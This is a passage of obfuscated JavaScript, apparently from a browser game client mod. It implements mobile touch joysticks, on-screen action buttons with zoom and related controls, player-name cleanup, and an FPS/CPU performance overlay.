                _0x48426c = true;
              }
            }
            if (_0x3627d0.touches.length === 1 && (_0x140be5 === 2 || _0x140be5 === 3)) {
              const _0x128629 = document.getElementById("img_i_" + _0x140be5);
              const _0x5f4f06 = document.getElementById("img_o_" + _0x140be5);
              if (vps.joystick && vps.joystick.mode === "dynamic") {
                const _0x231202 = _0x3627d0.touches[0];
                const _0x45f43d = _0x231202.clientX - 50;
                const _0x4e8fc3 = _0x231202.clientY - 50;
                window.dynamicJoystickCenter = {
                  x: _0x231202.clientX,
                  y: _0x231202.clientY
                };
                if (_0x5f4f06) {
                  _0x5f4f06.style.left = _0x45f43d + "px";
                  _0x5f4f06.style.top = _0x4e8fc3 + "px";
                  _0x5f4f06.style.opacity = "1";
                }
                if (_0x128629) {
                  _0x128629.style.left = _0x45f43d + 25 + "px";
                  _0x128629.style.top = _0x4e8fc3 + 25 + "px";
                  _0x128629.style.opacity = "1";
                }
              } else {
                if (_0x128629) {
                  _0x128629.style.opacity = "1";
                  _0x128629.style.left = _0x13e182 - 25 + "px";
                  _0x128629.style.top = _0x4272e2 - 25 + "px";
                }
                if (_0x5f4f06) {
                  _0x5f4f06.style.opacity = "1";
                }
              }
            }
            _0x3627d0.preventDefault();
          }
        }, {
          passive: false
        });
        _0xe0c05.addEventListener("touchmove", function (_0x375174) {
          if (_0x4d4705 && _0x375174.touches.length > 0) {
            if (_0x375174.touches.length >= 2 && !_0x3d22c4) {
              _0x3d22c4 = true;
              _0x3b6ea9.og.af.An = true;
            } else if (_0x375174.touches.length < 2 && _0x3d22c4) {
              _0x3d22c4 = false;
              _0x3b6ea9.og.af.An = false;
            }
            const _0x410ec0 = _0x375174.touches[0];
            const _0x4ae0f8 = _0x410ec0.clientX - _0x13e182;
            const _0x10a714 = _0x410ec0.clientY - _0x4272e2;
            const _0x1b50fb = Math.sqrt(_0x4ae0f8 * _0x4ae0f8 + _0x10a714 * _0x10a714);
            const _0x80e5f6 = Math.atan2(_0x10a714, _0x4ae0f8);
            const _0x17df1a = Math.atan2(_0x10a714, _0x4ae0f8);
            _0x3b6ea9.og.af.Bn = _0x17df1a;
            const _0xb3ad99 = 45;
            const _0x5e6ed2 = Math.min(_0x1b50fb, _0xb3ad99);
            const _0x2d9c57 = 180;
            const _0x55bcdb = Math.min(_0x1b50fb, _0x2d9c57);
            if (_0x1b50fb > 5) {
              const _0x1096ca = _0x140be5 === 1 ? "img_p_1" : _0x140be5 === 2 ? "img_p_2" : _0x140be5 === 3 ? "img_p_3" : _0x140be5 === 4 ? "img_p_4" : _0x140be5 === 5 ? "img_p_5" : "img_p_1";
              const _0x4a01bf = document.getElementById(_0x1096ca);
              if (_0x4a01bf) {
                const _0x5501d4 = window.innerWidth / 2;
                const _0x11e81b = window.innerHeight / 2;
                const _0x1d7e2f = Math.cos(_0x80e5f6) * _0x55bcdb;
                const _0x58277a = Math.sin(_0x80e5f6) * _0x55bcdb;
                _0x4a01bf.style.left = _0x5501d4 + _0x1d7e2f - 8 + "px";
                _0x4a01bf.style.top = _0x11e81b + _0x58277a - 8 + "px";
                _0x4a01bf.style.opacity = "1";
              }
            }
            if (_0x140be5 === 2 || _0x140be5 === 3) {
              const _0x449f01 = document.getElementById("img_i_" + _0x140be5);
              if (_0x449f01) {
                if (vps.joystick && vps.joystick.mode === "dynamic" && window.dynamicJoystickCenter) {
                  const _0x3a4490 = _0x375174.touches[0];
                  const _0x4e611a = window.dynamicJoystickCenter.x;
                  const _0x599d96 = window.dynamicJoystickCenter.y;
                  const _0xa9206d = _0x3a4490.clientX - _0x4e611a;
                  const _0x34107 = _0x3a4490.clientY - _0x599d96;
                  const _0x255593 = Math.sqrt(_0xa9206d * _0xa9206d + _0x34107 * _0x34107);
                  const _0x2cb95d = 40;
                  let _0x5242d8 = _0xa9206d;
                  let _0x278018 = _0x34107;
                  if (_0x255593 > _0x2cb95d) {
                    const _0x43a358 = _0x2cb95d / _0x255593;
                    _0x5242d8 = _0xa9206d * _0x43a358;
                    _0x278018 = _0x34107 * _0x43a358;
                  }
                  _0x449f01.style.left = _0x4e611a + _0x5242d8 - 25 + "px";
                  _0x449f01.style.top = _0x599d96 + _0x278018 - 25 + "px";
                  _0x449f01.style.opacity = "1";
                } else {
                  const _0x398a84 = 95;
                  const _0xd83e6b = window.innerHeight - 180 + 50;
                  const _0x588a0e = _0x375174.touches[0];
                  const _0x5c6bc9 = _0x588a0e.clientX - _0x398a84;
                  const _0x41b140 = _0x588a0e.clientY - _0xd83e6b;
                  const _0x765900 = Math.sqrt(_0x5c6bc9 * _0x5c6bc9 + _0x41b140 * _0x41b140);
                  const _0x935a88 = 40;
                  let _0x567dc5 = _0x5c6bc9;
                  let _0x258eaf = _0x41b140;
                  if (_0x765900 > _0x935a88) {
                    const _0x42e0ef = _0x935a88 / _0x765900;
                    _0x567dc5 = _0x5c6bc9 * _0x42e0ef;
                    _0x258eaf = _0x41b140 * _0x42e0ef;
                  }
                  _0x449f01.style.left = _0x398a84 + _0x567dc5 - 25 + "px";
                  _0x449f01.style.top = _0xd83e6b + _0x258eaf - 25 + "px";
                  _0x449f01.style.opacity = "1";
                }
              }
            }
            _0x375174.preventDefault();
          }
        }, {
          passive: false
        });
        _0xe0c05.addEventListener("touchend", function (_0x49684d) {
          if (_0x4d4705) {
            if (_0x49684d.touches.length < 2) {
              _0x3d22c4 = false;
              _0x3b6ea9.og.af.An = false;
            }
            if (_0x49684d.touches.length === 0) {
              _0x4d4705 = false;
              _0x48426c = false;
              const _0x45b85f = _0x140be5 === 1 ? "img_p_1" : _0x140be5 === 2 ? "img_p_2" : _0x140be5 === 3 ? "img_p_3" : _0x140be5 === 4 ? "img_p_4" : _0x140be5 === 5 ? "img_p_5" : "img_p_1";
              const _0x2910b9 = document.getElementById(_0x45b85f);
              if (_0x2910b9) {
                _0x2910b9.style.opacity = "0.25";
                const _0x54823b = window.innerWidth;
                const _0x399115 = window.innerHeight;
                if ((_0x140be5 === 2 || _0x140be5 === 3) && vps.joystick && vps.joystick.mode === "dynamic") {
                  _0x2910b9.style.opacity = "0";
                } else {
                  _0x2910b9.style.left = _0x54823b * 0.5 - 8 + "px";
                  _0x2910b9.style.top = _0x399115 * 0.5 - 8 + "px";
                }
              }
              if (_0x140be5 === 2 || _0x140be5 === 3) {
                const _0x396c2e = document.getElementById("img_i_" + _0x140be5);
                if (_0x396c2e) {
                  if (vps.joystick && vps.joystick.mode === "dynamic" && window.dynamicJoystickCenter) {
                    _0x396c2e.style.opacity = "0.25";
                    _0x396c2e.style.left = window.dynamicJoystickCenter.x - 25 + "px";
                    _0x396c2e.style.top = window.dynamicJoystickCenter.y - 25 + "px";
                  } else {
                    _0x396c2e.style.opacity = "0.25";
                    const _0x6cda8a = 95;
                    const _0x3a8da5 = window.innerHeight - 180 + 50;
                    _0x396c2e.style.left = _0x6cda8a - 25 + "px";
                    _0x396c2e.style.top = _0x3a8da5 - 25 + "px";
                  }
                }
              }
            }
          }
        }, {
          passive: false
        });
        if (_0x140be5 === 4 || _0x140be5 === 5) {
          const _0xad0e0c = document.getElementById("img_f");
          if (_0xad0e0c) {
            _0xad0e0c.style.pointerEvents = "auto";
            _0xad0e0c.style.cursor = "pointer";
            _0xad0e0c.style.opacity = "0.7";
            _0xad0e0c.addEventListener("touchstart", function (_0x53cb16) {
              _0x3b6ea9.og.af.An = true;
              _0x3d22c4 = true;
              _0xad0e0c.style.opacity = "1";
              _0xad0e0c.style.transform = "scale(0.95)";
              const _0x16704e = _0x140be5 === 4 ? "img_p_4" : "img_p_5";
              const _0x50a8a4 = document.getElementById(_0x16704e);
              const _0x5ccb92 = document.getElementById("img_pf_1");
              if (_0x50a8a4) {
                _0x50a8a4.style.display = "none";
              }
              if (_0x5ccb92) {
                _0x5ccb92.style.display = "block";
                _0x5ccb92.style.opacity = "1";
              }
              _0x53cb16.stopPropagation();
              _0x53cb16.preventDefault();
            }, {
              passive: false
            });
            _0xad0e0c.addEventListener("touchend", function (_0x10a7de) {
              _0x3b6ea9.og.af.An = false;
              _0x3d22c4 = false;
              _0xad0e0c.style.opacity = "0.7";
              _0xad0e0c.style.transform = "scale(1)";
              const _0x42b700 = _0x140be5 === 4 ? "img_p_4" : "img_p_5";
              const _0x39873b = document.getElementById(_0x42b700);
              const _0x268baa = document.getElementById("img_pf_1");
              if (_0x39873b) {
                _0x39873b.style.display = "block";
              }
              if (_0x268baa) {
                _0x268baa.style.display = "none";
              }
              _0x10a7de.stopPropagation();
              _0x10a7de.preventDefault();
            }, {
              passive: false
            });
            _0xad0e0c.addEventListener("mousedown", function (_0x5bc3a2) {
              _0x3b6ea9.og.af.An = true;
              _0x3d22c4 = true;
              _0xad0e0c.style.opacity = "1";
              _0xad0e0c.style.transform = "scale(0.95)";
              _0x5bc3a2.stopPropagation();
              _0x5bc3a2.preventDefault();
            });
            _0xad0e0c.addEventListener("mouseup", function (_0x323e5f) {
              _0x3b6ea9.og.af.An = false;
              _0x3d22c4 = false;
              _0xad0e0c.style.opacity = "0.7";
              _0xad0e0c.style.transform = "scale(1)";
              _0x323e5f.stopPropagation();
              _0x323e5f.preventDefault();
            });
          }
        }
      };
      if (_wup.ismobile) {
        var _0x7a7d0b = "";
        Object.keys(vps.configJoystick.buttons).forEach(function (_0x1e6fc5) {
          var _0x18e7a8;
          var _0x408478;
          var _0x3de74c = vps.configJoystick.buttons[_0x1e6fc5].action;
          if (_0x1e6fc5 === "respawn") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[87]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "lobby") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[88]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "swap") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[89]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "rotate") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[0]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "snail") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[2]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "laser") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[85]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "zoom") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[4]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "zoomplus") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[7]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else if (_0x1e6fc5 === "zoomminus") {
            _0x18e7a8 = "<img src=\"" + atob(savedImages[6]) + "\" style=\"object-fit:contain;\">";
            _0x408478 = "background:transparent;border:none;padding:0;cursor:pointer;display:flex;justify-content:center;align-items:center;";
          } else {}
          _0x7a7d0b = _0x7a7d0b + (vps.configJoystick.buttons[_0x1e6fc5].active ? "<button onclick=\"" + _0x3de74c + "\" id=\"gtr_" + _0x1e6fc5 + "\" style=\"" + _0x408478 + "\">" + _0x18e7a8 + "</button>" : "");
        });
        var _0xf8635 = "\n        <style>\n          #up-mobile-box {\n            position: fixed;z-index: 1001;width: 100%;top: 10px;\n            pointer-events: none;\n            transform: translateX(0px) !important;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #up-mobile-box {\n              transform: translateX(0px) !important;\n            }\n          }\n          \n          @media screen and (orientation: landscape) {\n            #up-mobile-box {\n              transform: translateX(0px) !important;\n            }\n          }\n        #up-mobile-buttons {\n          position: relative;\n          margin: 0 auto;\n          width: fit-content;\n          min-width: 50px;\n          max-width: 350px;\n          display: flex;\n          flex-wrap: nowrap;\n          justify-content: center;\n          align-items: center;\n          pointer-events: auto;\n          gap: 8px;\n          transform: translateX(0px);\n          padding: 5px 10px;\n          transition: width 0.3s ease;\n        }\n          #up-mobile-buttons > button {\n            transition: transform 0.1s, opacity 0.2s;\n            opacity: 0.25;\n            outline: none;\n            -webkit-tap-highlight-color: transparent;\n          }\n            #up-mobile-buttons > button:active {\n                transform: scale(1.1);\n                opacity: 1;\n                outline: none;\n              }\n              \n              #up-mobile-buttons > button:hover {\n                transform: scale(1.05);\n                opacity: 0.8;\n              }\n              \n              #up-mobile-buttons > button {\n                transition: transform 0.15s ease, opacity 0.2s ease;\n                opacity: 0.25;\n                outline: none;\n                -webkit-tap-highlight-color: transparent;\n              }\n          #up-mobile-buttons > button:focus {\n            outline: none;\n          }\n          #up-mobile-buttons > button.active {\n            opacity: 1;\n          }\n          #up-mobile-buttons > button img {\n            pointer-events: none;\n          }\n        .game-slider-container-02 {\n           position: fixed;\n           z-index: 1000;\n           bottom: 50px;\n           right: 10px;\n           pointer-events: auto !important;\n           z-index: 9999 !important;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical] {\n           writing-mode: vertical-lr;\n           direction: rtl;\n           appearance: slider-vertical;\n           width: 16px;\n           vertical-align: bottom;\n           pointer-events: auto !important;\n           z-index: 9999 !important;\n           filter: hue-rotate(190deg) saturate(1.8) brightness(1.3);\n           opacity: 0.3;\n           transition: opacity 0.3s ease;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]::-webkit-slider-thumb {\n           transform: scale(1.8);\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]::-moz-range-thumb {\n           transform: scale(1.8);\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]:hover,\n        .game-slider-container-02 input[type=range][orient=vertical]:focus {\n           opacity: 0.65;\n        }\n        .game-slider-container-02 input[type=range][orient=vertical]:hover::-webkit-slider-thumb,\n        .game-slider-container-02 input[type=range][orient=vertical]:focus::-webkit-slider-thumb {\n           transform: scale(2.2);\n        }\n          \n        \n          \n          #joystick-switch-btn:active {\n            transform: translateX(-50%) scale(0.95);\n            background: rgba(0,0,0,0.9);\n          }\n          \n          #joystick-switch-btn img {\n            width: 30px;\n            height: 15px;\n            object-fit: contain;\n            pointer-events: none;\n          }\n          \n          #joystick-type-label {\n            position: fixed;\n            bottom: 90px;\n            left: 50%;\n            transform: translateX(-50%);\n            color: #fff;\n            font-size: 9px;\n            text-align: center;\n            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);\n            z-index: 1002;\n            pointer-events: none;\n            background: rgba(0,0,0,0.5);\n            padding: 2px 8px;\n            border-radius: 10px;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #joystick-switch-btn {\n              bottom: 150px !important;\n            }\n            #joystick-type-label {\n              bottom: 120px !important;\n            }\n          }\n          \n          @media screen and (orientation: landscape) {\n            #joystick-switch-btn {\n              bottom: 100px !important;\n            }\n            #joystick-type-label {\n              bottom: 70px !important;\n            }\n          }\n          \n          #joystick-switch-btn img {\n            width: 35px;\n            height: 18px;\n            object-fit: contain;\n          }\n          \n          #joystick-type-label {\n            position: fixed;\n            bottom: 150px;\n            left: 50%;\n            transform: translateX(-50%);\n            color: #fff;\n            font-size: 10px;\n            text-align: center;\n            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);\n            z-index: 1002;\n            pointer-events: none;\n          }\n          \n          @media screen and (orientation: portrait) {\n            #joystick-switch-btn {\n              bottom: 220px !important;\n            }\n            #joystick-type-label {\n              bottom: 190px !important;\n            }\n          }\n        </style>\n        <div id=\"up-mobile-box\"><div id=\"up-mobile-buttons\">" + _0x7a7d0b + "</div></div>\n        \n        >\n        ";
        _0xf8635 = _0xf8635 + (vps.configJoystick.typeCurrent === "btn" ? "" : "<div id=\"up-mobile-box-slider\" class=\"game-slider-container-02\"><input id=\"sliderZoom\" orient=\"vertical\" onchange=\"gtr.gtrass9(this)\" type=\"range\" min=\"0.25\" max=\"" + (_0x5f32d0 ? 12 : 2) + "\" step=\"0.25\" value=\"1\" style=\"height: 65vh;\"></div>");
        $("body").append(_0xf8635);
        gtr.updateJoystickSwitchButton = function () {
          const _0x173e3c = {
            1: atob(savedImages[9]),
            2: atob(savedImages[10]),
            3: atob(savedImages[11]),
            4: atob(savedImages[12]),
            5: atob(savedImages[12]),
            6: atob(savedImages[9])
          };
          const _0x58a4b5 = {
            1: "النوع 1",
            2: "النوع 2",
            3: "النوع 3",
            4: "النوع 4",
            5: "النوع 5",
            6: "النوع 6"
          };
          const _0x2a9f52 = document.getElementById("joystick-icon");
          const _0x97642d = document.getElementById("joystick-type-label");
          if (_0x2a9f52) {
            _0x2a9f52.src = _0x173e3c[vps.joystickType];
          }
          if (_0x97642d) {
            _0x97642d.textContent = _0x58a4b5[vps.joystickType];
          }
        };
        setTimeout(function () {
          document.querySelectorAll("#up-mobile-buttons button").forEach(function (_0x17eb05) {
            var _0x161603 = _0x17eb05.getAttribute("onclick");
            _0x17eb05.removeAttribute("onclick");
            let _0x3ba5ea = false;
            _0x17eb05.addEventListener("touchstart", function (_0x29a572) {
              _0x29a572.preventDefault();
              _0x29a572.stopPropagation();
              this.style.transform = "scale(1.15)";
              this.style.opacity = "1";
              if (_0x3ba5ea) {
                return;
              }
              _0x3ba5ea = true;
              if (_0x161603) {
                try {
                  eval(_0x161603);
                } catch (_0x146ac2) {
                  console.error("خطأ في تنفيذ الإجراء:", _0x146ac2);
                }
              }
              setTimeout(() => {
                _0x3ba5ea = false;
              }, 200);
            }, {
              passive: false
            });
            _0x17eb05.addEventListener("touchend", function (_0x3f5460) {
              _0x3f5460.preventDefault();
              _0x3f5460.stopPropagation();
              this.style.transform = "scale(1)";
              var _0x134454 = this.id;
              if (_0x134454 === "gtr_laser") {
                if (window.gtr?.gtr_laser === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else if (_0x134454 === "gtr_rotate") {
                if (window.gtr?.gtr_rotate === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else if (_0x134454 === "gtr_snail") {
                if (window.gtr?.gtr_snail === true) {
                  this.style.opacity = "1";
                } else {
                  this.style.opacity = "0.25";
                }
              } else {
                this.style.opacity = "0.25";
              }
            }, {
              passive: false
            });
            _0x17eb05.addEventListener("touchend", function (_0x230879) {
              _0x230879.preventDefault();
              _0x230879.stopPropagation();
            }, {
              passive: false
            });
            _0x17eb05.addEventListener("touchstart", function (_0x447c20) {
              _0x447c20.stopPropagation();
            }, {
              passive: true
            });
            _0x17eb05.addEventListener("touchend", function (_0x58474d) {
              _0x58474d.stopPropagation();
            }, {
              passive: true
            });
          });
          var _0x9467a6 = document.getElementById("gtr_laser");
          if (_0x9467a6) {
            _0x9467a6.addEventListener("click", function (_0x14500d) {
              _0x14500d.stopPropagation();
              setTimeout(() => {
                gtr.updateLaserButton();
              }, 10);
            });
          }
          var _0x4c2c7a = document.getElementById("gtr_snail");
          if (_0x4c2c7a) {
            _0x4c2c7a.addEventListener("click", function (_0x24b345) {
              _0x24b345.stopPropagation();
              setTimeout(() => {
                var _0x26f542 = this.querySelector("img");
                if (_0x26f542 && window.gtr) {
                  if (window.gtr.gtr_snail === true) {
                    _0x26f542.src = atob(savedImages[3]);
                    this.style.opacity = "1";
                  } else {
                    _0x26f542.src = atob(savedImages[2]);
                    this.style.opacity = "0.25";
                  }
                }
              }, 150);
            });
          }
          var _0x2e4a41 = document.getElementById("gtr_zoom");
          if (_0x2e4a41) {
            _0x2e4a41.addEventListener("click", function (_0x181810) {
              _0x181810.stopPropagation();
              setTimeout(() => {
                var _0x1c0fec = this.querySelector("img");
              }, 150);
            });
          }
        }, 1000);
      }
      if (_wup.ismobile && vps.joystick.checked) {
        _0x42ac5d();
      }
    } catch (_0x193a0b) {
      console.error(_0x193a0b);
    }
  };
  function _0x54c117(_0x164fcb) {
    if (!_0x164fcb || typeof _0x164fcb !== "string") {
      return "";
    }
    _0x164fcb = _0x164fcb.replace(/_[a-zA-Z]{1,2}_.*$/i, "");
    _0x164fcb = _0x164fcb.replace(/_A.*$/i, "");
    _0x164fcb = _0x164fcb.replace(/__.*$/, "");
    _0x164fcb = _0x164fcb.replaceAll("_", " ");
    _0x164fcb = _0x164fcb.replace(/[\u0000-\u001F\u007F-\u009F]/g, "");
    _0x164fcb = _0x164fcb.replace(/\uFDFD/g, "");
    _0x164fcb = _0x164fcb.replace(/[\u064B-\u065F\u0640\u06D4]/g, "");
    _0x164fcb = _0x164fcb.replace(/\d{4,}/g, " ");
    _0x164fcb = _0x164fcb.replace(/[_\-\*\+\=\{\}\[\]]{3,}/g, " ");
    _0x164fcb = _0x164fcb.replace(/\s+/g, " ");
    _0x164fcb = _0x164fcb.replace(/^[\.\-\s]+|[\.\-\s]+$/g, "");
    if (_0x164fcb.length > 15) {
      _0x164fcb = _0x164fcb.substring(0, 15);
      _0x164fcb = _0x164fcb.replace(/[\uD800-\uDBFF]$/, "");
    }
    return _0x164fcb.trim();
  }
  window.PerformanceMonitor = {
    lastTime: performance.now(),
    frameCount: 0,
    fps: 0,
    cpuUsage: 0,
    fpsDisplay: null,
    cpuDisplay: null,
    isFpsVisible: false,
    isCpuVisible: false,
    cpuSamples: [],
    cpuSampleSize: 10,
    lastCpuTime: 0,
    isInitialized: false,
    _cpuMonitoringInterval: null,
    _animFrameId: null,
    init() {
      if (this.isInitialized) {
        return;
      }
      this.isInitialized = true;
      let _0x5c0c98 = false;
      if (typeof vps !== "undefined" && vps.performanceMonitorEnabled !== undefined) {
        _0x5c0c98 = vps.performanceMonitorEnabled;
      } else {
        const _0x8d311e = localStorage.getItem("showFpsCpu");
        if (_0x8d311e !== null) {
          _0x5c0c98 = _0x8d311e === "true";
        }
      }
      this.isFpsVisible = _0x5c0c98;
      this.isCpuVisible = _0x5c0c98;
      this.createDisplayElements();
      if (this.isFpsVisible || this.isCpuVisible) {
        this.startAllMonitoring();
      }
      this.setupKeyboardControls();
      this.updateDisplays();
      this.setupToggleButton();
    },
    startAllMonitoring() {
      if (this.isFpsVisible && !this._animFrameId) {
        this.startMonitoring();
      }
      if (this.isCpuVisible && !this._cpuMonitoringInterval) {
        this.startCpuMonitoring();
      }
    },
    stopAllMonitoring() {
      if (this._cpuMonitoringInterval) {
        clearInterval(this._cpuMonitoringInterval);
        this._cpuMonitoringInterval = null;
      }
      if (this._animFrameId) {
        cancelAnimationFrame(this._animFrameId);
        this._animFrameId = null;
      }
    },
    setupToggleButton() {
      const _0x1230c8 = document.getElementById("performance-monitor-toggle");
      if (_0x1230c8) {
        _0x1230c8.checked = this.isFpsVisible || this.isCpuVisible;
        _0x1230c8.addEventListener("change", () => {
          const _0x4daf4a = _0x1230c8.checked;
          this.toggle(_0x4daf4a);
        });
      } else {
        setTimeout(() => {
          const _0x57b582 = document.getElementById("performance-monitor-toggle");
          if (_0x57b582) {
            _0x57b582.checked = this.isFpsVisible || this.isCpuVisible;
            _0x57b582.addEventListener("change", () => {
              this.toggle(_0x57b582.checked);
            });
          }
        }, 1000);
      }
    },
    createDisplayElements() {
      const _0x251832 = document.getElementById("performance-monitor-style");
      if (!_0x251832) {
        const _0x493919 = document.createElement("style");
        _0x493919.id = "performance-monitor-style";
        _0x493919.textContent = "\n                        .performance-monitor-container {\n                            position: fixed;\n                            right: 5px;\n                            bottom: 5px;\n                            display: flex;\n                            gap: 5px;\n                            z-index: 9999;\n                            font-family: Arial, sans-serif;\n                            pointer-events: none;\n                            user-select: none;\n                        }\n                        .monitor-element {\n                            background-color: rgba(0, 0, 0, 0.5);\n                            font-size: 12px;\n                            height: 20px;\n                            line-height: 20px;\n                            border-radius: 4px;\n                            font-weight: bold;\n                            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);\n                            padding: 0 8px;\n                            white-space: nowrap;\n                            box-sizing: border-box;\n                            display: none;\n                        }\n                    ";
        document.head.appendChild(_0x493919);
      }
      let _0x592849 = document.querySelector(".performance-monitor-container");
      if (!_0x592849) {
        _0x592849 = document.createElement("div");
        _0x592849.className = "performance-monitor-container";
        document.body.appendChild(_0x592849);
      }
      if (!this.fpsDisplay) {
        this.fpsDisplay = document.createElement("div");
        this.fpsDisplay.className = "monitor-element";
        _0x592849.appendChild(this.fpsDisplay);
      }
      if (!this.cpuDisplay) {
        this.cpuDisplay = document.createElement("div");
        this.cpuDisplay.className = "monitor-element";
        _0x592849.appendChild(this.cpuDisplay);
      }
    },
    startCpuMonitoring() {
      if (!this.isCpuVisible) {
        return;
      }
      if (this._cpuMonitoringInterval) {
        clearInterval(this._cpuMonitoringInterval);
      }
      this.lastCpuTime = performance.now();
      this.cpuSamples = [];
      this._cpuMonitoringInterval = setInterval(() => {
        if (!this.isCpuVisible) {
          clearInterval(this._cpuMonitoringInterval);
          this._cpuMonitoringInterval = null;
          return;
        }
        this.measureCpuUsage();
      }, 500);
      if (window.gameIntervals) {
        window.gameIntervals.push(this._cpuMonitoringInterval);
      }
    },
    measureCpuUsage() {
      const _0xc7fae = performance.now();
      const _0xff1ef7 = _0xc7fae - this.lastCpuTime;
      const _0x3a0487 = 60;
      const _0xa76f86 = Math.max(0, _0x3a0487 - this.fps) / _0x3a0487;
      let _0x4a750e = 0;
      if (window.performance && window.performance.timing) {
        const _0x29ac4b = window.performance.timing;
        _0x4a750e = _0x29ac4b.domComplete - _0x29ac4b.navigationStart;
      }
      const _0x1e4ad7 = Math.min(1, window.anApp ? 0.7 : 0.3);
      const _0x15d5dc = Math.min(100, Math.round((_0xa76f86 * 70 + _0x4a750e / 1000 * 30) * _0x1e4ad7));
      this.cpuSamples.push(_0x15d5dc);
      if (this.cpuSamples.length > this.cpuSampleSize) {
        this.cpuSamples.shift();
      }
      this.cpuUsage = Math.round(this.cpuSamples.reduce((_0x4721fb, _0x40f62c) => _0x4721fb + _0x40f62c, 0) / this.cpuSamples.length);
      this.lastCpuTime = _0xc7fae;
      this.updateDisplays();
    },
    startMonitoring() {
      if (!this.isFpsVisible) {
        return;
      }
      if (this._animFrameId) {
        cancelAnimationFrame(this._animFrameId);
      }
      const _0x186d65 = () => {
        if (!this.isFpsVisible) {
          cancelAnimationFrame(this._animFrameId);
          this._animFrameId = null;
          return;
        }
        const _0xd797bf = performance.now();
        const _0xe4ec49 = _0xd797bf - this.lastTime;
        this.frameCount++;
        if (_0xe4ec49 >= 1000) {
          this.fps = Math.round(this.frameCount * 1000 / _0xe4ec49);
          this.frameCount = 0;
          this.lastTime = _0xd797bf;
          this.updateDisplays();
        }
        this._animFrameId = requestAnimationFrame(_0x186d65);
      };
      this._animFrameId = requestAnimationFrame(_0x186d65);
    },
    updateDisplays() {
      if (!this.fpsDisplay || !this.cpuDisplay) {
        return;
      }
      if (this.isFpsVisible) {
        this.fpsDisplay.textContent = "FPS: " + this.fps;
        if (this.fps >= 58) {
          this.fpsDisplay.style.color = "white";
        } else if (this.fps >= 30) {
          this.fpsDisplay.style.color = "gold";
        } else {
          this.fpsDisplay.style.color = "red";
        }
        this.fpsDisplay.style.display = "block";
      } else {
        this.fpsDisplay.style.display = "none";
      }
      if (this.isCpuVisible) {
        this.cpuDisplay.textContent = "CPU: " + this.cpuUsage + "%";
        if (this.cpuUsage <= 50) {
          this.cpuDisplay.style.color = "white";
        } else if (this.cpuUsage <= 80) {
          this.cpuDisplay.style.color = "gold";
        } else {
          this.cpuDisplay.style.color = "red";
        }
        this.cpuDisplay.style.display = "block";
      } else {
        this.cpuDisplay.style.display = "none";
      }
    },
    setupKeyboardControls() {
      if (this._hasSetupKeyboardControls) {
        return;
      }
      this._hasSetupKeyboardControls = true;
      document.addEventListener("keydown", _0x378204 => {
        if (_0x378204.key === "F2" || _0x378204.code === "F2" || _0x378204.keyCode === 113) {
          _0x378204.preventDefault();
          this.isCpuVisible = !this.isCpuVisible;
          if (this.isCpuVisible && !this._cpuMonitoringInterval) {
            this.startCpuMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x378204.key === "F4" || _0x378204.code === "F4" || _0x378204.keyCode === 115) {
          _0x378204.preventDefault();
          this.isFpsVisible = !this.isFpsVisible;
          if (this.isFpsVisible && !this._animFrameId) {
            this.startMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x378204.altKey && (_0x378204.key === "2" || _0x378204.keyCode === 50)) {
          _0x378204.preventDefault();
          this.isCpuVisible = !this.isCpuVisible;
          if (this.isCpuVisible && !this._cpuMonitoringInterval) {
            this.startCpuMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x378204.altKey && (_0x378204.key === "4" || _0x378204.keyCode === 52)) {
          _0x378204.preventDefault();
          this.isFpsVisible = !this.isFpsVisible;
          if (this.isFpsVisible && !this._animFrameId) {
            this.startMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        }
      }, true);
    },
    saveSettings() {
      const _0x221d37 = this.isFpsVisible || this.isCpuVisible;
      localStorage.setItem("showFpsCpu", _0x221d37);
    },
    updateToggleButton() {
      const _0x1250df = document.getElementById("performance-monitor-toggle");
      if (_0x1250df) {
